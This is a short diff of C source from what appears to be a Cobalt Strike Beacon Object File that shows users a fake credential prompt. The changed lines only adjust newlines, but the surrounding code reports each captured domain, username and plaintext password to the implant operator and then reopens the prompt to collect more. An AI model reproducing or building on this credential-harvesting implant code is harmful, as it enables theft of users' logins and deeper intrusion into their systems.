@@ -342,7 +342,7 @@ PromptResult run_prompt(
             if (credentials->domain[0] != L'\0') {
                 BeaconPrintf(
                     CALLBACK_OUTPUT,
-                    "\n[-] Validation failed (error=%u)\n[+] Identity: %ls\\%ls\n[+] Password: %ls\n[*] Reopening prompt\n",
+                    "\n\n[-] Validation failed (error=%u)\n[+] Identity: %ls\\%ls\n[+] Password: %ls\n[*] Reopening prompt",
                     last_auth_error,
                     credentials->domain,
                     credentials->username,
@@ -350,7 +350,7 @@ PromptResult run_prompt(
             } else {
                 BeaconPrintf(
                     CALLBACK_OUTPUT,
-                    "\n[-] Validation failed (error=%u)\n[+] Identity: %ls\n[+] Password: %ls\n[*] Reopening prompt\n",
+                    "\n\n[-] Validation failed (error=%u)\n[+] Identity: %ls\n[+] Password: %ls\n[*] Reopening prompt",
                     last_auth_error,
                     credentials->username,
                     credentials->password);
